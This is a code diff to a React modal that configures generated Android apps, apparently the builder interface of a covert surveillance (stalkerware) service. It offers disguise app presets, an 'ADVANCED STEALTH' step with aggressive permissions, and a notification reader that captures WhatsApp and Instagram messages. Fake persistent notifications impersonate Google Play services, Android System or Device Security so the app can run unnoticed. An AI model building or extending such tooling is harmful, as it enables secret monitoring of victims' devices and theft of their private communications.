@@ -1,13 +1,13 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import CustomAlertModal from './CustomAlertModal';
 import { 
     Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
     Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
-    Settings, ShieldCheck, ArrowDownCircle, Edit3, MousePointerClick
+    Settings, MousePointerClick
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -60,96 +60,6 @@ const APP_PRESETS = [
         infoTitle: 'Utility Toolkit',
         infoText: 'Launches a utility web application toolkit (h4k3r-bomber.vercel.app). Looks and behaves like a specialized developer utility app.'
     }
-];
-
-const NOTIFICATION_STYLES = [
-    {
-        id: 'google_play',
-        title: 'Google Play services',
-        text: 'Checking for updates…',
-        icon: 'info',
-        badge: 'ℹ️',
-        desc: 'Appears as official Google Play services background check'
-    },
-    {
-        id: 'android_system',
-        title: 'Android System',
-        text: 'Updating system components…',
-        icon: 'sync',
-        badge: '🔄',
-        desc: 'Authentic OS system sync indicator'
-    },
-    {
-        id: 'device_security',
-        title: 'Device Security',
-        text: 'Scanning for threats…',
-        icon: 'lock',
-        badge: '🔒',
-        desc: 'Security scan style notification'
-    },
-    {
-        id: 'system_ui',
-        title: 'System UI',
-        text: 'Syncing system data…',
-        icon: 'sync',
-        badge: '🔄',
-        desc: 'System UI background daemon style'
-    },
-    {
-        id: 'device_maintenance',
-        title: 'Device maintenance',
-        text: 'Optimizing performance…',
-        icon: 'sync',
-        badge: '⚙️',
-        desc: 'Standard device optimizer look'
-    },
-    {
-        id: 'download_manager',
-        title: 'Download Manager',
-        text: 'Download in progress…',
-        icon: 'download',
-        badge: '⬇️',
-        desc: 'Download manager progress appearance'
-    },
-    {
-        id: 'custom',
-        title: 'Custom Notification',
-        text: 'Configure your own title & text',
-        icon: 'info',
-        badge: '✏️',
-        desc: 'Write custom title, message & select icon'
-    }
-];
-
-const CLICK_ACTIONS = [
-    {
-        id: 'device_info',
-        title: 'Open Device Status Page',
-        desc: 'Opens harmless system diagnostic status view'
-    },
-    {
-        id: 'app_settings',
-        title: 'Open App Permissions',
-        desc: 'Opens Android application info settings'
-    },
-    {
-        id: 'launch_web',
-        title: 'Launch Web Portal',
-        desc: 'Opens your configured app web link'
-    },
-    {
-        id: 'none',
-        title: 'Do Nothing (Silent)',
-        desc: 'No action performed when tapped'
-    }
-];
-
-const CUSTOM_ICONS = [
-    { id: 'info', label: 'Info', symbol: 'ℹ️' },
-    { id: 'sync', label: 'Sync', symbol: '🔄' },
-    { id: 'lock', label: 'Security', symbol: '🔒' },
-    { id: 'download', label: 'Download', symbol: '⬇️' },
-    { id: 'settings', label: 'System', symbol: '⚙️' },
 ];
 
 export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
@@ -215,12 +125,41 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
     const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);
 
-    // Notification Style & Click Action State
+    // Background Service Style & Click Action State
     const [notificationStyle, setNotificationStyle] = useState("google_play");
     const [notificationClickAction, setNotificationClickAction] = useState("device_info");
+    const [notificationIcon, setNotificationIcon] = useState("info");
     const [notificationTitle, setNotificationTitle] = useState("");
     const [notificationText, setNotificationText] = useState("");
-    const [notificationIcon, setNotificationIcon] = useState("info");
+
+    // Custom UI Dropdown menu states
+    const [isStyleMenuOpen, setIsStyleMenuOpen] = useState(false);
+    const [isActionMenuOpen, setIsActionMenuOpen] = useState(false);
+    const [isIconMenuOpen, setIsIconMenuOpen] = useState(false);
+
+    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
+        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
+        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
+        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
+        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
+        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
+        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
+        custom: { title: "Custom Title", text: "Custom description text", icon: "✏️" },
+    };
+
+    const CLICK_ACTIONS: Record<string, { label: string; desc: string }> = {
+        device_info: { label: "Open Device Info / Settings", desc: "Opens Android app info screen" },
+        launch_app: { label: "Launch Main Disguise App", desc: "Opens the web portal or arcade" },
+        none: { label: "Do Nothing (Silent)", desc: "Ignores user taps on notification" },
+    };
+
+    const ICON_OPTIONS: Record<string, { label: string; symbol: string }> = {
+        info: { label: "Info Badge", symbol: "ℹ️" },
+        sync: { label: "Sync Arrow", symbol: "🔄" },
+        security: { label: "Shield Badge", symbol: "🔒" },
+        download: { label: "Download Arrow", symbol: "⬇️" },
+        gear: { label: "System Gear", symbol: "⚙️" },
+    };
 
     const [showCustomAlert, setShowCustomAlert] = useState(false);
     const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
@@ -371,11 +310,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             formData.append('notificationStyle', notificationStyle);
             formData.append('notificationClickAction', notificationClickAction);
+            formData.append('notificationIcon', notificationIcon);
 
             if (notificationStyle === 'custom') {
-                formData.append('notificationTitle', notificationTitle || activeApp.name);
-                formData.append('notificationText', notificationText || "Service active");
-                formData.append('notificationIcon', notificationIcon);
+                formData.append('notificationTitle', notificationTitle || 'System Service');
+                formData.append('notificationText', notificationText || 'Running background checks…');
             }
             if (selectedPreset === 'custom' && customIcon) {
                 formData.append('icon', customIcon);
@@ -540,15 +479,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </button>
                     </div>
 
-                    {/* Bottom row: Enhanced Step Navigation Bar with Wide Horizontal Glow */}
+                    {/* Bottom row: Wider Glowing Step Navigation Bar ("dono sides sa thora sa ziyda karo") */}
                     <div className="px-3 pb-3">
                         <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/40 border border-white/10">
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('identity')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3.5 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                     activeStep === 'identity'
-                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_20px_rgba(16,185,129,0.35)] scale-[1.01]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -558,9 +497,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('permissions')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3.5 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                     activeStep === 'permissions'
-                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_20px_rgba(16,185,129,0.35)] scale-[1.01]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -570,14 +509,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('notifications')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3.5 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                     activeStep === 'notifications'
-                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
+                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_20px_rgba(16,185,129,0.35)] scale-[1.01]'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
                                 <Bell size={14} className="flex-shrink-0" />
-                                <span>3. Notifications</span>
+                                <span>3. Service Style</span>
                             </button>
                         </div>
                     </div>
@@ -753,7 +692,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {/* STEP 2: APP ACCESS PERMISSIONS & ADVANCED STEALTH */}
                     {activeStep === 'permissions' && (
                         <div className="space-y-5">
-                            {/* Stylish Highlighted Title Indicator */}
+                            {/* Stylish Highlighted Title Indicator ("ADD YOUR PERMISSIONS IN APP") */}
                             <div className="flex items-center gap-2.5 px-1">
                                 <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                 <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
@@ -761,7 +700,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </span>
                             </div>
 
-                            {/* Core Permissions Grid */}
+                            {/* Core Permissions Grid (Now includes Notification Reader prominent card!) */}
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                                 
                                 {/* Gallery & Storage - Soft Emerald */}
@@ -784,31 +723,23 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Notification Monitor (WhatsApp, Insta & Alerts) - Soft Sky */}
+                                {/* Notification Reader (Monitored Alerts) - Soft Sky ("notification permission jo monitor karti hai woh add karo ui ma") */}
                                 <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-sky-200">Notification Monitor</span>
-                                            {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
-                                                    PRO
-                                                </span>
-                                            )}
+                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
                                             <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-sky-300/70">Monitors & captures WhatsApp, Instagram, Telegram & social message alerts.</span>
+                                        <span className="text-xs text-sky-300/70">Monitors WhatsApp, Instagram & incoming messaging notifications.</span>
                                     </div>
                                     <button
                                         type="button"
-                                        onClick={() => {
-                                            if (isBasicPlan) { onUpgrade?.(); return; }
-                                            setEnableNotificationListener(!enableNotificationListener);
-                                        }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
+                                        onClick={() => setEnableNotificationListener(!enableNotificationListener)}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
@@ -972,136 +903,222 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & CLICK BEHAVIOR */}
+                    {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & ACTION */}
                     {activeStep === 'notifications' && (
                         <div className="space-y-6">
                             
-                            {/* Section Title ("SELECT NOTIFICATION STYLE") */}
+                            {/* Header Indicator */}
                             <div className="flex items-center gap-2.5 px-1">
                                 <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                 <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
-                                    SELECT NOTIFICATION STYLE
+                                    SELECT BACKGROUND SERVICE STYLE
                                 </span>
                             </div>
 
-                            {/* Custom UI Visual Preset Cards Grid (Replaces browser HTML select dropdown) */}
-                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                                {NOTIFICATION_STYLES.map((style) => {
-                                    const isSelected = notificationStyle === style.id;
-                                    return (
-                                        <button
-                                            key={style.id}
-                                            type="button"
-                                            onClick={() => setNotificationStyle(style.id)}
-                                            className={`p-3.5 rounded-2xl border text-left flex items-start justify-between gap-3 transition-all ${
-                                                isSelected
-                                                    ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_18px_rgba(16,185,129,0.2)] scale-[1.01]'
-                                                    : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.03]'
-                                            }`}
-                                        >
-                                            <div className="flex items-start gap-3 min-w-0">
-                                                <span className="text-2xl flex-shrink-0 mt-0.5">{style.badge}</span>
-                                                <div className="min-w-0">
-                                                    <span className={`text-xs font-extrabold block truncate ${isSelected ? 'text-white' : 'text-fg-2'}`}>
-                                                        {style.title}
-                                                    </span>
-                                                    <span className="text-[11px] text-fg-3 block truncate">{style.text}</span>
-                                                    <span className="text-[10px] text-emerald-400/80 block mt-1">{style.desc}</span>
+                            {/* Custom UI Dropdown Selector for Notification Style */}
+                            <div className="space-y-4">
+                                <div className="relative">
+                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Display Style</label>
+                                    
+                                    {/* Custom UI Card Dropdown Button */}
+                                    <button
+                                        type="button"
+                                        onClick={() => {
+                                            setIsStyleMenuOpen(!isStyleMenuOpen);
+                                            setIsActionMenuOpen(false);
+                                            setIsIconMenuOpen(false);
+                                        }}
+                                        className="w-full bg-black/60 border border-emerald-500/40 hover:border-emerald-500/70 rounded-2xl p-4 flex items-center justify-between text-left transition-all shadow-[0_0_15px_rgba(16,185,129,0.15)]"
+                                    >
+                                        <div className="flex items-center gap-3">
+                                            <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
+                                            <div>
+                                                <div className="text-sm font-bold text-white">
+                                                    {NOTIFICATION_PRESETS[notificationStyle]?.title || "Google Play services"}
+                                                </div>
+                                                <div className="text-xs text-fg-3">
+                                                    {NOTIFICATION_PRESETS[notificationStyle]?.text || "Checking for updates…"}
                                                 </div>
                                             </div>
-                                            {isSelected && <CheckCircle2 size={18} className="text-emerald-400 flex-shrink-0 mt-1" />}
-                                        </button>
-                                    );
-                                })}
-                            </div>
+                                        </div>
+                                        <ChevronDown size={18} className={`text-emerald-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
+                                    </button>
 
-                            {/* Custom Notification Input Fields & Icon Selector (ONLY WHEN 'custom' IS SELECTED) */}
-                            {notificationStyle === 'custom' && (
-                                <div className="p-4 rounded-2xl bg-black/50 border border-emerald-500/30 space-y-4 animate-in fade-in">
-                                    <div className="text-xs font-extrabold text-emerald-300 uppercase tracking-wider">
-                                        Customize Notification Appearance
-                                    </div>
+                                    {/* Custom UI Dropdown List */}
+                                    {isStyleMenuOpen && (
+                                        <div className="absolute z-50 top-full left-0 right-0 mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-64 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                            {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
+                                                <button
+                                                    key={key}
+                                                    type="button"
+                                                    onClick={() => {
+                                                        setNotificationStyle(key);
+                                                        setIsStyleMenuOpen(false);
+                                                    }}
+                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
+                                                        notificationStyle === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    }`}
+                                                >
+                                                    <div className="flex items-center gap-3">
+                                                        <span className="text-xl">{preset.icon}</span>
+                                                        <div>
+                                                            <div className="text-xs font-extrabold text-white">{preset.title}</div>
+                                                            <div className="text-[11px] text-fg-4">{preset.text}</div>
+                                                        </div>
+                                                    </div>
+                                                    {notificationStyle === key && <CheckCircle2 size={16} className="text-emerald-400" />}
+                                                </button>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
 
-                                    {/* Custom Title */}
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Notification Title</label>
-                                        <input
-                                            type="text"
-                                            value={notificationTitle}
-                                            onChange={(e) => setNotificationTitle(e.target.value)}
-                                            className="w-full bg-black/60 border border-white/15 rounded-xl px-3.5 py-2.5 text-white text-xs font-bold focus:outline-none focus:border-emerald-500/60"
-                                            placeholder="e.g. Google Play services"
-                                        />
-                                    </div>
+                                {/* Custom UI Dropdown Selector for On-Click Action ("agar notification pe click kare toh kya open hoga") */}
+                                <div className="relative">
+                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">When User Taps Notification</label>
+                                    
+                                    <button
+                                        type="button"
+                                        onClick={() => {
+                                            setIsActionMenuOpen(!isActionMenuOpen);
+                                            setIsStyleMenuOpen(false);
+                                            setIsIconMenuOpen(false);
+                                        }}
+                                        className="w-full bg-black/60 border border-white/15 hover:border-white/30 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
+                                    >
+                                        <div className="flex items-center gap-3">
+                                            <div className="w-8 h-8 rounded-xl bg-white/5 flex items-center justify-center text-emerald-300">
+                                                <MousePointerClick size={16} />
+                                            </div>
+                                            <div>
+                                                <div className="text-xs font-bold text-white">
+                                                    {CLICK_ACTIONS[notificationClickAction]?.label || "Open Device Info / Settings"}
+                                                </div>
+                                                <div className="text-[11px] text-fg-4">
+                                                    {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android app info screen"}
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
+                                    </button>
 
-                                    {/* Custom Text */}
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Notification Message Text</label>
-                                        <input
-                                            type="text"
-                                            value={notificationText}
-                                            onChange={(e) => setNotificationText(e.target.value)}
-                                            className="w-full bg-black/60 border border-white/15 rounded-xl px-3.5 py-2.5 text-white text-xs focus:outline-none focus:border-emerald-500/60"
-                                            placeholder="e.g. Checking for updates…"
-                                        />
-                                    </div>
+                                    {/* Action Dropdown List */}
+                                    {isActionMenuOpen && (
+                                        <div className="absolute z-50 top-full left-0 right-0 mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
+                                            {Object.entries(CLICK_ACTIONS).map(([key, item]) => (
+                                                <button
+                                                    key={key}
+                                                    type="button"
+                                                    onClick={() => {
+                                                        setNotificationClickAction(key);
+                                                        setIsActionMenuOpen(false);
+                                                    }}
+                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
+                                                        notificationClickAction === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    }`}
+                                                >
+                                                    <div>
+                                                        <div className="text-xs font-extrabold text-white">{item.label}</div>
+                                                        <div className="text-[11px] text-fg-4">{item.desc}</div>
+                                                    </div>
+                                                    {notificationClickAction === key && <CheckCircle2 size={16} className="text-emerald-400" />}
+                                                </button>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
 
-                                    {/* Custom Icon Selector UI */}
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 mb-1.5">Select Status Bar Icon</label>
-                                        <div className="grid grid-cols-5 gap-2">
-                                            {CUSTOM_ICONS.map((iconObj) => {
-                                                const selected = notificationIcon === iconObj.id;
-                                                return (
-                                                    <button
-                                                        key={iconObj.id}
-                                                        type="button"
-                                                        onClick={() => setNotificationIcon(iconObj.id)}
-                                                        className={`p-2.5 rounded-xl border flex flex-col items-center justify-center gap-1 transition-all ${
-                                                            selected
-                                                                ? 'bg-emerald-500/20 border-emerald-500/60 text-white shadow-sm'
-                                                                : 'bg-black/40 border-white/10 text-fg-3 hover:border-white/20'
-                                                        }`}
-                                                    >
-                                                        <span className="text-lg">{iconObj.symbol}</span>
-                                                        <span className="text-[10px] font-bold">{iconObj.label}</span>
-                                                    </button>
-                                                );
-                                            })}
+                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon ("icon select kar sakty") */}
+                                <div className="relative">
+                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Status Bar Icon</label>
+                                    
+                                    <button
+                                        type="button"
+                                        onClick={() => {
+                                            setIsIconMenuOpen(!isIconMenuOpen);
+                                            setIsStyleMenuOpen(false);
+                                            setIsActionMenuOpen(false);
+                                        }}
+                                        className="w-full bg-black/60 border border-white/15 hover:border-white/30 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
+                                    >
+                                        <div className="flex items-center gap-3">
+                                            <span className="text-xl">{ICON_OPTIONS[notificationIcon]?.symbol || "ℹ️"}</span>
+                                            <div className="text-xs font-bold text-white">
+                                                {ICON_OPTIONS[notificationIcon]?.label || "Info Badge"}
+                                            </div>
+                                        </div>
+                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isIconMenuOpen ? 'rotate-180' : ''}`} />
+                                    </button>
+
+                                    {/* Icon Dropdown List */}
+                                    {isIconMenuOpen && (
+                                        <div className="absolute z-50 top-full left-0 right-0 mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
+                                            {Object.entries(ICON_OPTIONS).map(([key, item]) => (
+                                                <button
+                                                    key={key}
+                                                    type="button"
+                                                    onClick={() => {
+                                                        setNotificationIcon(key);
+                                                        setIsIconMenuOpen(false);
+                                                    }}
+                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors ${
+                                                        notificationIcon === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    }`}
+                                                >
+                                                    <div className="flex items-center gap-3">
+                                                        <span className="text-lg">{item.symbol}</span>
+                                                        <span className="text-xs font-bold text-white">{item.label}</span>
+                                                    </div>
+                                                    {notificationIcon === key && <CheckCircle2 size={16} className="text-emerald-400" />}
+                                                </button>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+
+                                {/* Custom Notification Fields (Shown only when style === 'custom') */}
+                                {notificationStyle === 'custom' && (
+                                    <div className="space-y-3 bg-black/50 p-4 rounded-2xl border border-white/10 shadow-inner animate-in fade-in">
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Title</label>
+                                            <input
+                                                type="text"
+                                                value={notificationTitle}
+                                                onChange={(e) => setNotificationTitle(e.target.value)}
+                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
+                                                placeholder="Google Play services"
+                                            />
+                                        </div>
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Text</label>
+                                            <input
+                                                type="text"
+                                                value={notificationText}
+                                                onChange={(e) => setNotificationText(e.target.value)}
+                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
+                                                placeholder="Checking for updates…"
+                                            />
                                         </div>
                                     </div>
-                                </div>
-                            )}
+                                )}
 
-                            {/* Notification Click Action Selector UI ("agar notification pe click kare tu kya open hoga") */}
-                            <div className="space-y-3 pt-3 border-t border-white/10">
-                                <label className="block text-xs font-extrabold text-fg-3 uppercase tracking-widest">
-                                    Notification Tap Action
-                                </label>
-                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
-                                    {CLICK_ACTIONS.map((action) => {
-                                        const isSelected = notificationClickAction === action.id;
-                                        return (
-                                            <button
-                                                key={action.id}
-                                                type="button"
-                                                onClick={() => setNotificationClickAction(action.id)}
-                                                className={`p-3 rounded-xl border text-left flex items-center justify-between transition-all ${
-                                                    isSelected
-                                                        ? 'bg-emerald-500/15 border-emerald-500/60 text-white shadow-sm'
-                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
-                                                }`}
-                                            >
-                                                <div>
-                                                    <span className={`text-xs font-bold block ${isSelected ? 'text-emerald-300' : 'text-fg-2'}`}>
-                                                        {action.title}
-                                                    </span>
-                                                    <span className="text-[10px] text-fg-4 block">{action.desc}</span>
+                                {/* Live Android Status Bar Preview Card */}
+                                <div className="bg-gradient-to-b from-black/80 to-black/50 rounded-2xl p-4 border border-white/10 shadow-inner space-y-2">
+                                    <div className="text-[10px] font-bold text-fg-4 uppercase tracking-widest">Notification Drawer Preview</div>
+                                    <div className="flex items-center justify-between p-3 rounded-xl bg-white/[0.04] border border-white/5">
+                                        <div className="flex items-center gap-3">
+                                            <span className="text-xl">{ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
+                                            <div>
+                                                <div className="text-xs font-bold text-white">
+                                                    {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
                                                 </div>
-                                                {isSelected && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0" />}
-                                            </button>
-                                        );
-                                    })}
+                                                <div className="text-[11px] text-fg-3">
+                                                    {notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : NOTIFICATION_PRESETS[notificationStyle]?.text}
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <span className="text-[10px] text-emerald-400 font-mono">Running</span>
+                                    </div>
                                 </div>
                             </div>
                         </div>
